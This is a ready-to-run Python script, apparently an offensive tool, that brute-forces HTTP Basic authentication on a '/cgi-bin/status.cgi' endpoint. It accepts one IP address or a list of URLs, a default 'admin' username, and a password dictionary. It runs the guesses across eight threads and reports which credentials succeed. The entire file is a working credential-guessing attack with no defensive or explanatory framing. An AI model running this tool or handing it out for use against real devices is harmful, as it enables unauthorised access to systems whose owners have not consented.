#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import base64
import argparse
import requests
import threading

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        group = parser.add_mutually_exclusive_group()
        group.add_argument(
            "-i", "--ip", dest="ipAddress", metavar="ip", default="192.168.1.10",
            help="specify ip address (default: 192.168.1.10)"
        )
        parser.add_argument(
            "-p", "--port", dest="portNumber", metavar="port", default="80",
            help="specify port number (default: 80)"
        )
        group.add_argument(
            "-l", "--list", dest="urlList", metavar="list",
            help="specify url file path (example: ./urls.txt)"
        )
        parser.add_argument(
            "-u", "--name", dest="userName", metavar="name", default="admin",
            help="specify username (default: admin)"
        )
        parser.add_argument(
            "-k", "--pass", dest="userPass", metavar="pass", default="12345",
            help="specify userpass (default: 12345)"
        )
        parser.add_argument(
            "-d", "--pass-dict", dest="passDict", metavar="dict",
            help="specify dict file path (example: ./dict.txt)"
        )
        return parser.parse_args()

opt = Parser().optparse()

ip = opt.ipAddress
port = opt.portNumber
path = opt.urlList
username = opt.userName
userpass = opt.userPass
passdict = opt.passDict
# cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()

# headers = {
#     "Authorization": "Basic {}".format(cred)
# }

thread_nums = 8
sema = threading.BoundedSemaphore(value=thread_nums)

def worker_by_url(url):
    global userpass
    with sema:
        try:
            if passdict:
                with open(passdict, encoding='utf-8') as f:
                    dicts = f.readlines()
                    for passwd in dicts:
                        userpass = passwd.strip()
                        cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
                        headers = {
                            "Authorization": "Basic {}".format(cred)
                        }
                        r = requests.get("http://{}/cgi-bin/status.cgi".format(url), headers=headers, timeout=10)

                        if r.status_code == 200:
                            print("[+] Sending Request:", url, r.status_code, userpass, flush=True)
                        else:
                            print("[-] Request Failed:", url, r.status_code, userpass, flush=True)

            else:
                cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
                headers = {
                    "Authorization": "Basic {}".format(cred)
                }
                r = requests.get("http://{}/cgi-bin/status.cgi".format(url), headers=headers, timeout=10)

                if r.status_code == 200:
                    print("[+] Sending Request:", url, r.status_code, userpass, flush=True)
                else:
                    print("[-] Request Failed:", url, r.status_code, userpass, flush=True)
        
        except Exception as e:
            print("[!] Error:", e)
            pass
        except BrokenPipeError:
            pass

def worker_by_ip(ip):
    global userpass
    with sema:
        try:
            if passdict:
                with open(passdict, encoding='utf-8') as f:
                    dicts = f.readlines()
                    for passwd in dicts:
                        userpass = passwd.strip()
                        cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
                        headers = {
                            "Authorization": "Basic {}".format(cred)
                        }
                        if ip and port:
                            r = requests.get("http://{}:{}/cgi-bin/status.cgi".format(ip, port), headers=headers, timeout=10)
                        else:
                            r = requests.get("http://{}/cgi-bin/status.cgi".format(ip), headers=headers, timeout=10)

                        if r.status_code == 200:
                            print("[+] Sending Request:", ip, port, r.status_code, userpass, flush=True)
                        else:
                            print("[-] Request Failed:", ip, port, r.status_code, userpass, flush=True)

            elif ip and port:
                cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
                headers = {
                    "Authorization": "Basic {}".format(cred)
                }
                r = requests.get("http://{}:{}/cgi-bin/status.cgi".format(ip, port), headers=headers, timeout=10)

                if r.status_code == 200:
                    print("[+] Sending Request:", ip, port, r.status_code, userpass, flush=True)
                else:
                    print("[-] Request Failed:", ip, port, r.status_code, userpass, flush=True)

            else:
                cred = (base64.b64encode((username+':'+userpass).encode('utf-8'))).decode()
                headers = {
                    "Authorization": "Basic {}".format(cred)
                }
                r = requests.get("http://{}/cgi-bin/status.cgi".format(ip), headers=headers, timeout=10)
            
                if r.status_code == 200:
                    print("[+] Sending Request:", ip, port, r.status_code, userpass, flush=True)
                else:
                    print("[-] Request Failed:", ip, port, r.status_code, userpass, flush=True)
        
        except Exception as e:
            print("[!] Error:", e)
            pass
        except BrokenPipeError:
            pass

def main():
    if path:
        threads = []
        with open(path, encoding='utf-8') as f:
            lists = f.readlines()
            for line in lists:
                t = threading.Thread(target=worker_by_url, args=(line.strip(), ), daemon=True)
                threads.append(t)
                t.start()
        for t in threads:
            t.join()
    else:
        worker_by_ip(ip)

if __name__ == '__main__':
    try:
        main()
    except IOError:
        print("[!] File is not accessible")
    except (KeyboardInterrupt, SystemExit):
        print("[*] Stopped")
        sys.exit()
